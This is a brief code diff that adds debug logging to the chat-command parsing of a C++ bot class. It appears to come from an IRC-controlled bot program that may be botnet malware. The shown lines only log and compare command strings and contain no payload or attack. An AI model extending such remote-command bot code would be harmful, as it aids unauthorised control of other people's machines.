@@ -60,6 +60,10 @@ void CBot::Recv(CMessage *pMsg)
 	pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
 
 	// Check if its a bot command by comparing the first byte to the bot_prefix value
+#ifdef DBGCONSOLE
+    g_cMainCtrl.m_cConsDbg.Log(5, "pMsg->sCmd=%s\n", pMsg->sCmd.CStr());
+    g_cMainCtrl.m_cConsDbg.Log(5, "bot_prefix.sValue=%s\n", bot_prefix.sValue.CStr());
+#endif
     if(pMsg->sChatString[0]==bot_prefix.sValue[0])
     {
             if(!pMsg->sCmd.Compare("bot.repeat"))
